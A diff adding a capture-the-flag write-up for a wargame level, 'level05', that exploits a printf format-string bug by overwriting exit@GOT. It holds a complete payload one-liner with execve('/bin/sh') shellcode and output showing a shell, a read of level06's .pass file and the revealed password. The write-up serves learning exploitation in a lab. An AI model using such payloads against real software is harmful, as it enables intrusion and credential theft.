@@ -89,3 +89,45 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+fgets → lowercase A–Z → `printf(buf)` → `exit(0)`
+Not an overflow. Format string + no ret after printf, so we overwrite exit@GOT, not EIP.
+
+Filter kills uppercase bytes in the format part. `strlen` / `printf` stop at the first \0, so shellcode after a `NUL` is untouched.
+
+```sh
+exit@GOT = 0x080497e0
+buf is printf arg 10          %10$ %11$
+&buf     = 0xffffd6c8         (gdb, LINES/COLUMNS unset)
+```
+
+so our payload looks like this:
+
+```sh
+\xe0\x97\x04\x08              exit@GOT
+\xe2\x97\x04\x08              exit@GOT + 2
+
+%55011x                       count = 55011 + 8 previous bytes = 55019 = 0xd6eb
+%10$hn                        write count inside 10th argument 0x080497e0 -> 0xd6eb
+
+%10516x                       count = 10516 + 55019 previous bytes = 65535 = 0xffff
+%11$hn                        write count inside 11th argument 0x080497e2 -> 0xffff
+
+# [0x080497e2][0x080497e0]
+#     ffff        d6eb
+# *exit@GOT = 0xffffd6eb = start of shellcode in buffer
+
+\x00                          NULL byte that prevent the while loop corrupting the following shellcode
+
+SHELLCODE
+```
+
+```sh
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55011x" + "%10$hn" + "%10516x" + "%11$hn" + "\x00" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; cat) | ./level05
+```
+
+```sh
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
